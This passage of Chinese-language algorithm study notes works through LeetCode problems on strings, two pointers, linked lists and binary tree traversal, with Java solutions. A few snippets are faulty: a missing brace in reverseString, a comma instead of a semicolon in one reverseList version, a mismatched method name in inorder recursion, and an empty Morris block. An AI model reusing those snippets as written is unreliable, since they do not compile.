个，则反转前 k 个字符\n            reverse(arr, i, Math.min(i + k, n) - 1);\n        }\n        return String.valueOf(arr);\n    }\n\n    public void reverse(char[] arr, int left, int right) {\n        while (left < right) {\n            char temp = arr[left];\n            arr[left] = arr[right];\n            arr[right] = temp;\n            left++;\n            right--;\n        }\n    }\n}\n```\n\n### [剑指 Offer 05. 替换空格](https://leetcode.cn/problems/ti-huan-kong-ge-lcof/)\n\n请实现一个函数，把字符串 `s` 中的每个空格替换成\"%20\"。\n\n```properties\n输入：s = \"We are happy.\"\n输出：\"We%20are%20happy.\"\n```\n\n```java\nclass Solution {\n    public String replaceSpace(String s) {\n        StringBuilder sb = new StringBuilder();\n        for(int i = 0; i < s.length(); i++){\n            if(s.charAt(i) == ' '){\n                sb.append(\"%20\");\n            } else {\n                sb.append(s.charAt(i));\n            }\n        }      \n        return sb.toString();\n    }\n}\n```\n\n### [151. 反转字符串中的单词 ](https://leetcode.cn/problems/reverse-words-in-a-string/)\n\n给你一个字符串 `s` ，请你反转字符串中 **单词** 的顺序。\n\n**单词** 是由非空格字符组成的字符串。`s` 中使用至少一个空格将字符串中的 **单词** 分隔开。\n\n返回 **单词** 顺序颠倒且 **单词** 之间用单个空格连接的结果字符串。\n\n**注意：**输入字符串 `s`中可能会存在前导空格、尾随空格或者单词间的多个空格。返回的结果字符串中，单词间应当仅用单个空格分隔，且不包含任何额外的空格。\n\n**示例 1：**\n\n```properties\n输入：s = \"the sky is blue\"\n输出：\"blue is sky the\"\n```\n\n**示例 2：**\n\n```properties\n输入：s = \"  hello world  \"\n输出：\"world hello\"\n解释：反转后的字符串中不能存在前导空格和尾随空格。\n```\n\n**示例 3：**\n\n```properties\n输入：s = \"a good   example\"\n输出：\"example good a\"\n解释：如果两个单词间有多余的空格，反转后的字符串需要将单词间的空格减少到仅有一个。\n```\n\n------\n\n```java\nclass Solution {\n    public String reverseWords(String s) {\n        // 除去开头和末尾的空白字符\n        s = s.trim();\n        // 正则匹配连续的空白字符作为分隔符分割\n        List<String> wordList = Arrays.asList(s.split(\"\\\\s+\"));\n        Collections.reverse(wordList);\n        return String.join(\" \", wordList);\n    }\n}\n\n// 分割 + 倒序\nclass Solution {\n    public String reverseWords(String s) {\n        String[] strs = s.trim().split(\" \"); // 删除首尾空格，分割字符串\n        StringBuilder res = new StringBuilder();\n        for(int i = strs.length - 1; i >= 0; i--) { // 倒序遍历单词列表\n            if(strs[i].equals(\"\")) continue; // 遇到空则跳过\n            res.append(strs[i] + \" \"); // 将单词拼接至 StringBuilder\n        }\n        return res.toString().trim(); // 转化为字符串，删除尾部空格，并返回\n    }\n}\n\n// 双指针\nclass Solution {\n    public String reverseWords(String s) {\n        s = s.trim(); // 删除首尾空格\n        int j = s.length() - 1, i = j;\n        StringBuilder res = new StringBuilder();\n        while(i >= 0) {\n            while(i >= 0 && s.charAt(i) != ' ') i--; // 搜索首个空格\n            res.append(s.substring(i + 1, j + 1) + \" \"); // 添加单词\n            while(i >= 0 && s.charAt(i) == ' ') i--; // 跳过单词间空格\n            j = i; // j 指向下个单词的尾字符\n        }\n        return res.toString().trim(); // 转化为字符串并返回\n    }\n}\n```\n\n### [剑指 Offer 58 - II. 左旋转字符串](https://leetcode.cn/problems/zuo-xuan-zhuan-zi-fu-chuan-lcof/)\n\n字符串的左旋转操作是把字符串前面的若干个字符转移到字符串的尾部。请定义一个函数实现字符串左旋转操作的功能。比如，输入字符串\"abcdefg\"和数字2，该函数将返回左旋转两位得到的结果\"cdefgab\"。\n\n**示例 1：**\n\n```properties\n输入: s = \"abcdefg\", k = 2\n输出: \"cdefgab\"\n```\n\n**示例 2：**\n\n```properties\n输入: s = \"lrloseumgh\", k = 6\n输出: \"umghlrlose\"\n```\n\n```java\nclass Solution {\n    public String reverseLeftWords(String s, int n) {\n        StringBuilder sb = new StringBuilder();\n        for(int i = n; i < s.length(); i++){\n            sb.append(s.charAt(i));\n        }\n        for(int i = 0; i < n; i++){\n             sb.append(s.charAt(i));\n        }\n        return sb.toString();\n    }\n}\n\nclass Solution {\n    public String reverseLeftWords(String s, int n) {\n        return s.substring(n, s.length()) + s.substring(0, n);\n    }\n}\n```\n\n### [28. 找出字符串中第一个匹配项的下标](https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string/)\n\n给你两个字符串 `haystack` 和 `needle` ，请你在 `haystack` 字符串中找出 `needle` 字符串的第一个匹配项的下标（下标从 0 开始）。如果 `needle` 不是 `haystack` 的一部分，则返回  `-1` 。\n\n**示例 1：**\n\n```properties\n输入：haystack = \"sadbutsad\", needle = \"sad\"\n输出：0\n解释：\"sad\" 在下标 0 和 6 处匹配。\n第一个匹配项的下标是 0 ，所以返回 0 。\n```\n\n**示例 2：**\n\n```properties\n输入：haystack = \"leetcode\", needle = \"leeto\"\n输出：-1\n解释：\"leeto\" 没有在 \"leetcode\" 中出现，所以返回 -1 。\n```\n\n------\n\n**暴力破解**\n\n```java\nclass Solution {\n    public int strStr(String haystack, String needle) {\n        int n = haystack.length(), m = needle.length();\n        // 枚举原串的「发起点」\n        for(int i = 0; i <= n - m; i++){\n            boolean flag = true;\n            for(int j = 0; j < m; j++){\n                // 从原串的「发起点」和匹配串的「首位」开始，尝试匹配\n                if(haystack.charAt(i + j) != needle.charAt(j)){\n                    flag = false;\n                    break;\n                }\n            }\n            // 如果能够完全匹配，返回原串的「发起点」下标\n            if(flag) return i;\n        }\n        return -1;\n    }\n}\n```\n\n**KMP算法**\n\n```java\nclass Solution {\n    public static int strStr(String haystack, String needle) {\n        int n = haystack.length(), m = needle.length();\n        if (m == 0) return 0;\n\n        // 1.构建 next 数组\n        int[] next = new int[m]; //next[0]=0\n        for (int i = 1, j = 0; i < m; i++) {\n            // 匹配不成功的话，j = next(j-1)\n            while (j > 0 && needle.charAt(i) != needle.charAt(j)) {\n                j = next[j - 1];\n            }\n            // 匹配成功的话，j++\n            if (needle.charAt(i) == needle.charAt(j)) {\n                j++;\n            }\n            // 更新 next[i]\n            next[i] = j;\n        }\n\n        // 2.匹配过程\n        for (int i = 0, j = 0; i < n; i++) {\n            // 匹配不成功 j = next(j-1)\n            while (j > 0 && haystack.charAt(i) != needle.charAt(j)) {\n                j = next[j - 1];\n            }\n            // 匹配成功的话，j++\n            if (haystack.charAt(i) == needle.charAt(j)) {\n                j++;\n            }\n            if (j == m) {\n                return i - m + 1;\n            }\n        }\n        return -1;\n    }\n}\n```\n\n\n\n### [459. 重复的子字符串](https://leetcode.cn/problems/repeated-substring-pattern/description/)\n\n给定一个非空的字符串 `s` ，检查是否可以通过由它的一个子串重复多次构成。\n\n**示例 1:**\n\n```properties\n输入: s = \"abab\"\n输出: true\n解释: 可由子串 \"ab\" 重复两次构成。\n```\n\n**示例 2:**\n\n```properties\n输入: s = \"aba\"\n输出: false\n```\n\n**示例 3:**\n\n```properties\n输入: s = \"abcabcabcabc\"\n输出: true\n解释: 可由子串 \"abc\" 重复四次构成。 (或子串 \"abcabc\" 重复两次构成。)\n```\n\n**方法一：枚举**\n\n如果一个长度为 n 的字符串 s 可以由它的一个长度为 m 的子串 s′ 重复多次构成，那么：\n\n-   n 一定是 m 的倍数；\n-   s′ 一定是 s 的前缀；\n-   对于任意的 `i∈[m,n)`，有 `s[i] = s[i − m]`。\n\n小优化：因为子串至少需要重复一次，所以 m 不会大于 n 的一半，所以只需在 `[1,n/2]`的范围内枚举 m 即可。\n\n```java\nclass Solution {\n    public boolean repeatedSubstringPattern(String s) {\n        int n = s.length();\n        for(int m = 1; m <= n/2; m++){\n            if(n % m == 0){\n                boolean match = true;\n                for(int i = m; i < n; i++){\n                    if(s.charAt(i) != s.charAt(i - m)) {\n                        match = false;\n                        break;\n                    }\n                }\n                if(match){\n                    return true;\n                }\n            }\n        }\n        return false;\n    }\n}\n```\n\n## ⑥双指针\n\n### [344. 反转字符串](https://leetcode.cn/problems/reverse-string/)\n\n编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组 `s` 的形式给出。\n\n不要给另外的数组分配额外的空间，你必须**原地修改输入数组**、使用 O(1) 的额外空间解决这一问题。\n\n**示例 1：**\n\n```properties\n输入：s = [\"h\",\"e\",\"l\",\"l\",\"o\"]\n输出：[\"o\",\"l\",\"l\",\"e\",\"h\"]\n```\n\n**示例 2：**\n\n```properties\n输入：s = [\"H\",\"a\",\"n\",\"n\",\"a\",\"h\"]\n输出：[\"h\",\"a\",\"n\",\"n\",\"a\",\"H\"]\n```\n\n------\n\n```java\nclass Solution {\n    public void reverseString(char[] s) {\n        int left = 0, right = s.length - 1;\n        while(left < right){\n            char tmp  = s[left];\n            s[left] = s[right];\n            s[right] = tmp;\n            left++;\n            right--;\n    }\n}\n  \nclass Solution {\n    public void reverseString(char[] s) {\n        int n = s.length;\n        for (int left = 0, right = n - 1; left < right; ++left, --right) {\n            char tmp = s[left];\n            s[left] = s[right];\n            s[right] = tmp;\n        }\n    }\n}\n  \nclass Solution {\n    public void reverseString(char[] s) {\n        int l = 0;\n        int r = s.length - 1;\n        while (l < r) {\n            s[l] ^= s[r];  //构造 a ^ b 的结果，并放在 a 中\n            s[r] ^= s[l];  //将 a ^ b 这一结果再 ^ b ，存入b中，此时 b = a, a = a ^ b\n            s[l] ^= s[r];  //a ^ b 的结果再 ^ a ，存入 a 中，此时 b = a, a = b 完成交换\n            l++;\n            r--;\n        }\n    }\n}  \n```\n\n### [27. 移除元素](https://leetcode.cn/problems/remove-element/)\n\n给你一个数组 `nums` 和一个值 `val`，你需要原地移除所有数值等于 `val` 的元素，并返回移除后数组的新长度。\n\n不要使用额外的数组空间，你必须仅使用 `O(1)` 额外空间并原地修改输入数组。\n\n元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素。\n\n```java\n//双指针\nclass Solution {\n    public int removeElement(int[] nums, int val) {\n        //快慢指针解法\n        int slow = 0; //慢指针\n        //快指针，无论与val值是否相同每遍历一次都要移动一位\n        for(int fast = 0; fast < nums.length; fast++){\n            //快指针先走，判断快指针指向的元素是否等于val\n            if(nums[fast] != val){\n                nums[slow] = nums[fast];\n                slow++;  //只有当快指针不等于val的时候，慢指针才和快指针一起移动一位\n            }\n        }\n        return slow;\n    }\n}\n\n//通用解法\nclass Solution {\n    public int removeElement(int[] nums, int val) {\n        int idx = 0;\n        for (int x : nums) {\n            if (x != val) nums[idx++] = x;\n        }\n        return idx;\n    }\n}\n```\n\n###  [剑指 Offer 05. 替换空格](https://leetcode.cn/problems/ti-huan-kong-ge-lcof/)\n\n请实现一个函数，把字符串 `s` 中的每个空格替换成\"%20\"。\n\n```properties\n输入：s = \"We are happy.\"\n输出：\"We%20are%20happy.\"\n```\n\n```java\nclass Solution {\n    public String replaceSpace(String s) {\n        StringBuilder sb = new StringBuilder();\n        for(int i = 0; i < s.length(); i++){\n            if(s.charAt(i) == ' '){\n                sb.append(\"%20\");\n            } else {\n                sb.append(s.charAt(i));\n            }\n        }      \n        return sb.toString();\n    }\n}\n```\n\n### [151. 反转字符串中的单词 ](https://leetcode.cn/problems/reverse-words-in-a-string/)\n\n给你一个字符串 `s` ，请你反转字符串中 **单词** 的顺序。\n\n**单词** 是由非空格字符组成的字符串。`s` 中使用至少一个空格将字符串中的 **单词** 分隔开。\n\n返回 **单词** 顺序颠倒且 **单词** 之间用单个空格连接的结果字符串。\n\n**注意：**输入字符串 `s`中可能会存在前导空格、尾随空格或者单词间的多个空格。返回的结果字符串中，单词间应当仅用单个空格分隔，且不包含任何额外的空格。\n\n**示例 1：**\n\n```properties\n输入：s = \"the sky is blue\"\n输出：\"blue is sky the\"\n```\n\n**示例 2：**\n\n```properties\n输入：s = \"  hello world  \"\n输出：\"world hello\"\n解释：反转后的字符串中不能存在前导空格和尾随空格。\n```\n\n**示例 3：**\n\n```properties\n输入：s = \"a good   example\"\n输出：\"example good a\"\n解释：如果两个单词间有多余的空格，反转后的字符串需要将单词间的空格减少到仅有一个。\n```\n\n------\n\n```java\nclass Solution {\n    public String reverseWords(String s) {\n        // 除去开头和末尾的空白字符\n        s = s.trim();\n        // 正则匹配连续的空白字符作为分隔符分割\n        List<String> wordList = Arrays.asList(s.split(\"\\\\s+\"));\n        Collections.reverse(wordList);\n        return String.join(\" \", wordList);\n    }\n}\n\n// 分割 + 倒序\nclass Solution {\n    public String reverseWords(String s) {\n        String[] strs = s.trim().split(\" \"); // 删除首尾空格，分割字符串\n        StringBuilder res = new StringBuilder();\n        for(int i = strs.length - 1; i >= 0; i--) { // 倒序遍历单词列表\n            if(strs[i].equals(\"\")) continue; // 遇到空则跳过\n            res.append(strs[i] + \" \"); // 将单词拼接至 StringBuilder\n        }\n        return res.toString().trim(); // 转化为字符串，删除尾部空格，并返回\n    }\n}\n\n// 双指针\nclass Solution {\n    public String reverseWords(String s) {\n        s = s.trim(); // 删除首尾空格\n        int j = s.length() - 1, i = j;\n        StringBuilder res = new StringBuilder();\n        while(i >= 0) {\n            while(i >= 0 && s.charAt(i) != ' ') i--; // 搜索首个空格\n            res.append(s.substring(i + 1, j + 1) + \" \"); // 添加单词\n            while(i >= 0 && s.charAt(i) == ' ') i--; // 跳过单词间空格\n            j = i; // j 指向下个单词的尾字符\n        }\n        return res.toString().trim(); // 转化为字符串并返回\n    }\n}\n```\n\n### [206. 反转链表 ](https://leetcode.cn/problems/reverse-linked-list/)\n\n给你单链表的头节点 `head` ，请你反转链表，并返回反转后的链表。\n\n**示例 1：**\n\n![](https://assets.leetcode.com/uploads/2021/02/19/rev1ex1.jpg)\n\n```\n输入：head = [1,2,3,4,5]\n输出：[5,4,3,2,1]\n```\n\n**示例 2：**\n\n![](https://assets.leetcode.com/uploads/2021/02/19/rev1ex2.jpg)\n\n```\n输入：head = [1,2]\n输出：[2,1]\n```\n\n**示例 3：**\n\n```\n输入：head = []\n输出：[]\n```\n\n**进阶：**链表可以选用迭代或递归方式完成反转。你能否用两种方法解决这道题？\n\n```java\n//迭代法（双指针法）\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        ListNode pre = null;\n        ListNode cur = head;\n        ListNode tmp = null;\n        while(cur != null){\n            tmp = cur.next;\n            cur.next = pre;\n            pre = cur;\n            cur = tmp;\n        }\n        return pre;\n    }\n}\n\n// 递归法\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        return reverse(null,head);\n    }\n    public ListNode reverse(ListNode pre, ListNode cur){\n        if (cur == null) {\n            return pre;\n        }\n        ListNode tmp = null;\n        tmp = cur.next;\n        cur.next = pre;\n        return reverse(cur,tmp);\n    }\n}\n\n//栈实现1(不推荐，效率不高)\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        Deque<ListNode> stack = new ArrayDeque<>();\n        while(head != null){\n            stack.push(head);\n            head = head.next;\n        }\n        ListNode dummy = new ListNode(0);\n        ListNode temp = dummy;\n        while(!stack.isEmpty()){\n            temp.next = stack.pop();\n            temp = temp.next;\n        }\n        temp.next = null; //最后节点不接null会形成环链\n        return dummy.next;\n    }\n}\n//栈实现2(不推荐，效率不高)\nclass Solution {\n    public ListNode reverseList(ListNode head) {\n        Deque<ListNode> stack = new ArrayDeque<>();\n        while(head != null){\n            stack.add(head);\n            head = head.next;\n        }\n        ListNode dummy = new ListNode(0),\n        ListNode temp = dummy;\n        while(stack.size() != 0){\n            temp.next = new ListNode(stack.pop());//防止形成环链\n            temp = temp.next;\n        }\n        return dummy.next;\n    }\n}\n\n```\n\n### [26. 删除有序数组中的重复项](https://leetcode.cn/problems/remove-duplicates-from-sorted-array/)\n\n给你一个 **升序排列** 的数组 `nums` ，请你 原地 删除重复出现的元素，使每个元素 **只出现一次** ，返回删除后数组的新长度。元素的 **相对顺序** 应该保持 **一致** 。\n\n由于在某些语言中不能改变数组的长度，所以必须将结果放在数组nums的第一部分。更规范地说，如果在删除重复项之后有 `k` 个元素，那么 `nums` 的前 `k` 个元素应该保存最终结果。\n\n将最终结果插入 `nums` 的前 `k` 个位置后返回 `k` 。\n\n不要使用额外的空间，你必须在 原地 并在使用 O(1) 额外空间的条件下完成。\n\n**示例 1：**\n\n```properties\n输入：nums = [1,1,2]\n输出：2, nums = [1,2,_]\n解释：函数应该返回新的长度 2 ，并且原数组 nums 的前两个元素被修改为 1, 2 。不需要考虑数组中超出新长度后面的元素。\n```\n\n**示例 2：**\n\n```properties\n输入：nums = [0,0,1,1,1,2,2,3,3,4]\n输出：5, nums = [0,1,2,3,4]\n解释：函数应该返回新的长度 5 ， 并且原数组 nums 的前五个元素被修改为 0, 1, 2, 3, 4 。不需要考虑数组中超出新长度后面的元素。\n```\n\n```java\n//双指针\nclass Solution {\n    public int removeDuplicates(int[] nums) {\n         //快慢指针解法\n        int slow = 0; //慢指针\n        //快指针，无论与val值是否相同每遍历一次都要移动一位\n        for(int fast = 0; fast < nums.length; fast++){\n            //快指针先走，判断快指针指向的元素是否等于val\n            if(nums[fast] != nums[slow]){\n                nums[++slow] = nums[fast];\n            }\n        }\n        return slow + 1;\n    }\n}\n\nclass Solution {\n    public int removeDuplicates(int[] nums) {   \n        int idx = 0; \n        for (int x : nums) {\n            if (idx < 1 || nums[idx - 1] != x) \n                nums[idx++] = x;\n        }\n        return idx;\n    }\n}\n\n//通用解法\nclass Solution {\n    public int removeDuplicates(int[] nums) {   \n        return process(nums, 1);\n    }\n    //保留 k 个相同数字\n    int process(int[] nums, int k) {\n        int idx = 0; \n        for (int x : nums) {\n            if (idx < k || nums[idx - k] != x) \n              nums[idx++] = x;\n        }\n        return idx;\n    }\n}\n```\n\n### [面试题 02.07. 链表相交](https://leetcode.cn/problems/intersection-of-two-linked-lists-lcci/)\n\n>输入两个链表，找出它们的第一个公共节点。\n>\n>如下面的两个链表：\n>\n>![](https://img.jwt1399.top/img/202208201148217.png)\n>\n>在节点 c1 开始相交。\n>\n>示例 1：\n>\n>![](https://img.jwt1399.top/img/202208201148988.png)\n>\n>```\n>输入：intersectVal = 8, listA = [4,1,8,4,5], listB = [5,0,1,8,4,5], skipA = 2, skipB = 3\n>输出：Reference of the node with value = 8\n>输入解释：相交节点的值为 8 （注意，如果两个列表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,0,1,8,4,5]。在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。\n>```\n>\n>\n>示例 2：\n>\n>![](https://img.jwt1399.top/img/202208201148108.png)\n>\n>```\n>输入：intersectVal = 2, listA = [0,9,1,2,4], listB = [3,2,4], skipA = 3, skipB = 1\n>输出：Reference of the node with value = 2\n>输入解释：相交节点的值为 2 （注意，如果两个列表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [0,9,1,2,4]，链表 B 为 [3,2,4]。在 A 中，相交节点前有 3 个节点；在 B 中，相交节点前有 1 个节点。\n>```\n>\n>\n>示例 3：\n>\n>![](https://img.jwt1399.top/img/202208201148832.png)\n>\n>```\n>输入：intersectVal = 0, listA = [2,6,4], listB = [1,5], skipA = 3, skipB = 2\n>输出：null\n>输入解释：从各自的表头开始算起，链表 A 为 [2,6,4]，链表 B 为 [1,5]。由于这两个链表不相交，所以 intersectVal 必须为 0，而 skipA 和 skipB 可以是任意值。\n>解释：这两个链表不相交，因此返回 null。\n>```\n\n```java\npublic class Solution {\n    public ListNode getIntersectionNode(ListNode headA, ListNode headB) {\n        ListNode A = headA;\n        ListNode B = headB;\n        while(A != B){\n            if(A != null) A = A.next;\n            else A = headB;\n            if(B != null) B = B.next;\n            else B = headA;\n        }\n        return A;\n    }\n}\n```\n\n### [142. 环形链表 II ](https://leetcode.cn/problems/linked-list-cycle-ii/description/)\n\n给定一个链表的头节点  `head` ，返回链表开始入环的第一个节点。 _如果链表无环，则返回 `null`。_\n\n如果链表中有某个节点，可以通过连续跟踪 `next` 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 `pos` 来表示链表尾连接到链表中的位置（**索引从 0 开始**）。如果 `pos` 是 `-1`，则在该链表中没有环。**注意：`pos` 不作为参数进行传递**，仅仅是为了标识链表的实际情况。\n\n**不允许修改** 链表。\n\n**示例 1：**\n\n![](https://assets.leetcode.com/uploads/2018/12/07/circularlinkedlist.png)\n\n```\n输入：head = [3,2,0,-4], pos = 1\n输出：返回索引为 1 的链表节点\n解释：链表中有一个环，其尾部连接到第二个节点。\n```\n\n**示例 2：**\n\n![](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test2.png)\n\n```\n输入：head = [1,2], pos = 0\n输出：返回索引为 0 的链表节点\n解释：链表中有一个环，其尾部连接到第一个节点。\n```\n\n**示例 3：**\n\n![](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test3.png)\n\n```\n输入：head = [1], pos = -1\n输出：返回 null\n解释：链表中没有环。\n```\n\n**进阶：**你是否可以使用 `O(1)` 空间解决此题？\n\n------\n\n**方法一：哈希表**\n\n遍历链表中的每个节点，并将它记录下来；一旦遇到了此前遍历过的节点，就可以判定链表中存在环。\n\n```java\npublic class Solution {\n    public ListNode detectCycle(ListNode head) {\n        Set<ListNode> set = new HashSet<>();\n        ListNode temp = head;\n        while(temp != null){\n            if(set.contains(temp)){\n                return temp;\n            }\n            set.add(temp);\n            temp = temp.next;\n        }\n        return null;\n    }\n}\n```\n\n时间复杂度：O(N)，其中 N 为链表中节点的数目。我们恰好需要访问链表中的每一个节点。\n\n空间复杂度：O(N)，其中 N 为链表中节点的数目。我们需要将链表中的每个节点都保存在哈希表当中。\n\n**方法二：快慢指针**\n\n**双指针第一次相遇：** 设两指针 `fast`，`slow` 指向链表头部 `head`，`fast` 每轮走 2 步，`slow` 每轮走 1 步；\n\n1.  **第一种结果：** `fast` 指针走过链表末端，说明链表无环，直接返回 `null`；\n2.  **第二种结果：** 当`fast == slow`时， 两指针在环中 **第一次相遇** 。\n\n**双指针第二次相遇：**\n\n-   `slow`指针 **位置不变** ，将`fast`指针重新 **指向链表头部节点** ；`slow`和`fast`同时每轮向前走 1 步；\n-   当 `fast` 指针走到链表环入口，**两指针重合**。\n\n```java\npublic class Solution {\n    public ListNode detectCycle(ListNode head) {\n        ListNode fast = head, slow = head;\n        while(true){\n            if(fast == null || fast.next == null) return null;\n            fast = fast.next.next;\n            slow = slow.next;\n            if(fast == slow) break;\n        }\n        fast = head;\n        while(fast != slow){\n            fast = fast.next;\n            slow = slow.next;\n        }\n        return fast;\n    }\n}\n```\n\n### [15. 三数之和](https://leetcode.cn/problems/3sum/)\n\n给你一个整数数组 `nums` ，判断是否存在三元组 `[nums[i], nums[j], nums[k]]` 满足 `i != j`、`i != k` 且 `j != k` ，同时还满足 `nums[i] + nums[j] + nums[k] == 0` 。请你返回所有和为 `0` 且不重复的三元组。\n\n**注意：**答案中不可以包含重复的三元组。\n\n**示例 1：**\n\n```properties\n输入：nums = [-1,0,1,2,-1,-4]\n输出：[[-1,-1,2],[-1,0,1]]\n解释：\nnums[0] + nums[1] + nums[2] = (-1) + 0 + 1 = 0 。\nnums[1] + nums[2] + nums[4] = 0 + 1 + (-1) = 0 。\nnums[0] + nums[3] + nums[4] = (-1) + 2 + (-1) = 0 。\n不同的三元组是 [-1,0,1] 和 [-1,-1,2] 。\n注意，输出的顺序和三元组的顺序并不重要。\n```\n\n**示例 2：**\n\n```properties\n输入：nums = [0,1,1]\n输出：[]\n解释：唯一可能的三元组和不为 0 。\n```\n\n**示例 3：**\n\n```properties\n输入：nums = [0,0,0]\n输出：[[0,0,0]]\n解释：唯一可能的三元组和为 0 。\n```\n\n------\n\n```java\n//双指针\nclass Solution {\n    public static List<List<Integer>> threeSum(int[] nums) {\n        List<List<Integer>> ans = new ArrayList();\n        int len = nums.length;\n        if(nums == null || len < 3) return ans;\n        Arrays.sort(nums); // 排序\n        for (int i = 0; i < len ; i++) {\n            //如果第一个就大于0，则三数之和一定大于0，结束循环\n            if(nums[i] > 0) break; \n            //如果连续两个元素相等就跳过第二个，避免重复\n            if(i > 0 && nums[i] == nums[i-1]) continue; // 去重\n            int L = i + 1;\n            int R = len - 1;\n            while(L < R){\n                int sum = nums[i] + nums[L] + nums[R];\n                if (sum < 0) L++;\n                else if (sum > 0) R--;\n                else if(sum == 0){\n                    ans.add(Arrays.asList(nums[i],nums[L],nums[R]));\n                    while (L < R && nums[L] == nums[++L]); // 去重\n                    while (L < R && nums[R] == nums[--R]); // 去重\n                }\n            }\n        }        \n        return ans;\n    }\n}\n```\n\n### [18. 四数之和](https://leetcode.cn/problems/4sum/)\n\n给你一个由 `n` 个整数组成的数组 `nums` ，和一个目标值 `target` 。请你找出并返回满足下述全部条件且**不重复**的四元组 `[nums[a], nums[b], nums[c], nums[d]]` （若两个四元组元素一一对应，则认为两个四元组重复）：\n\n-   `0 <= a, b, c, d < n`\n-   `a`、`b`、`c` 和 `d` **互不相同**\n-   `nums[a] + nums[b] + nums[c] + nums[d] == target`\n\n你可以按 **任意顺序** 返回答案 。\n\n**示例 1：**\n\n```properties\n输入：nums = [1,0,-1,0,-2,2], target = 0\n输出：[[-2,-1,1,2],[-2,0,0,2],[-1,0,0,1]]\n```\n\n**示例 2：**\n\n```properties\n输入：nums = [2,2,2,2,2], target = 8\n输出：[[2,2,2,2]]\n```\n\n------\n\n```java\nclass Solution {\n    public List<List<Integer>> fourSum(int[] nums, int target) {\n        List<List<Integer>> res = new ArrayList<>();\n        Arrays.sort(nums);\n        for(int i = 0; i < nums.length; i++){\n            //nums[i] < 0时不一定得去重\n            //数组是[-4, -3, -2, -1]，target是-10，不能因为-4 > -10而跳过\n            if(nums[i] > 0 && nums[i] > target) break; //去重\n            if(i > 0 && nums[i] == nums[i - 1]) continue; //去重\n            for(int j = i + 1; j < nums.length; j++){\n                if (j > i + 1 && nums[j - 1] == nums[j]) continue; //去重\n                int L = j + 1, R = nums.length - 1;\n                while(L < R) {\n                    int sum = nums[i] + nums[j] + nums[L] + nums[R];\n                    if(sum > target) R--;\n                    else if(sum < target) L++;\n                    else {\n                        res.add(Arrays.asList(nums[i],nums[j],nums[L],nums[R]));\n                        while(L < R && nums[L] == nums[L + 1]) L++; //去重\n                        while(L < R && nums[R] == nums[R - 1]) R--; //去重\n                        L++; \n                        R--;\n                    }\n                }  \n            }\n        }\n        return res;\n    }\n}\n```\n\n## ⑦二叉树\n\n二叉树基础知识请参考：[数据结构-树 | 简言之 (jwt1399.top)](https://jwt1399.top/posts/19968.html)\n\n```java\n//Definition for a binary tree node.\npublic class TreeNode {\n    int val;\n  \tTreeNode left;\n  \tTreeNode right;\n  \tTreeNode() {}\n  \tTreeNode(int val) { this.val = val; }\n  \tTreeNode(int val, TreeNode left, TreeNode right) {\n    \t\tthis.val = val;\n    \t\tthis.left = left;\n    \t\tthis.right = right;\n  \t}\n}\n```\n\n我们有一棵二叉树：\n\n```\n               根\n              /  \\\n             左   右\n```\n\n栈是一种 `先进后出`的结构，那么入栈顺序必须调整为倒序\n\n- 前序遍历，出栈顺序：根左右; 入栈顺序：右左根\n- 中序遍历，出栈顺序：左根右; 入栈顺序：右根左\n- 后序遍历，出栈顺序：左右根; 入栈顺序：根右左\n\n### [144. 二叉树的前序遍历](https://leetcode.cn/problems/binary-tree-preorder-traversal/)\n\n> **先输出父节点**，再遍历左子树和右子树\n\n#### 1.递归\n\n```java\n/**\n *时间：O(n)\n *空间：O(h)\n**/\nclass Solution {\n    public List<Integer> preorderTraversal(TreeNode root) {\n        List<Integer> res = new ArrayList<>();\n        dfs(root, res);\n        return res;\n    }\n\n    public void dfs(TreeNode root, List<Integer> res){\n        if(root == null){\n            return;\n        }\n        res.add(root.val);\n        dfs(root.left, res);\n        dfs(root.right, res);\n    }\n}\n```\n\n#### 2.迭代\n\n> 1. 弹栈顶入列表\n> 2. 如有右，**先**入右\n> 3. 如有左，**再**入左\n\n```java\n/**\n *时间：O(n)\n *空间：O(h)\n**/\nclass Solution {\n    public List<Integer> preorderTraversal(TreeNode root) {\n        List<Integer> res = new ArrayList<>();\n        Deque<TreeNode> stack = new LinkedList<>();// 用栈来实现迭代\n        if(root == null) {\n          return res;\n        }\n        stack.push(root);\n        while(!stack.isEmpty()){\n            TreeNode tmp = stack.pop();\n            res.add(tmp.val);\n            if(tmp.right != null){ //先进右节点，后出\n                stack.push(tmp.right);\n            }\n            if(tmp.left != null){ //后进左节点，先出\n                stack.push(tmp.left);\n            }\n        }\n        return res;\n    } \n}\n```\n\n#### 3.Morris\n\nMorris 遍历的核心思想是利用树的大量空闲指针，实现空间开销的极限缩减。其前序遍历规则总结如下：\n\n```java\n/**\n *时间：O(n)\n *空间：O(1)\n**/\n\n```\n\n### [94. 二叉树的中序遍历](https://leetcode.cn/problems/binary-tree-inorder-traversal/)\n\n> 先遍历左子树，**再输出父节点**，再遍历右子树\n\n#### 1.递归\n\n```java\n/**\n *时间：O(n)\n *空间：O(h)\n**/\nclass Solution {\n    public List<Integer> inorderTraversal(TreeNode root) {\n        List<Integer> res = new ArrayList<>();\n        dfs(root, res);\n        return res;\n    }\n    public void inorderRecur(TreeNode root, List<Integer> res){\n        if(root == null){\n            return;\n        }\n        dfs(root.left, res);\n        res.add(root.val);\n        dfs(root.right, res);\n    }\n}\n```\n\n#### 2.迭代\n\n> 1. 根结点不为空，入栈并向左走。整条界依次入栈\n> 2. 根结点为空，弹栈顶打印，向右走。\n>\n\n```java\n/**\n *时间：O(n)\n *空间：O(h)\n**/\nclass Solution {\n    public List<Integer> inorderTraversal(TreeNode root) {\n        List<Integer> res = new ArrayList<Integer>();\n        Deque<TreeNode> stack = new LinkedList<TreeNode>();\n        while (root != null || !stack.isEmpty()) { \n            while (root != null) { // 将左子树全部入栈\n                stack.push(root);\n                root = root.left;\n            }\n            TreeNode tmp = stack.pop(); \n            res.add(tmp.val);\n            root = 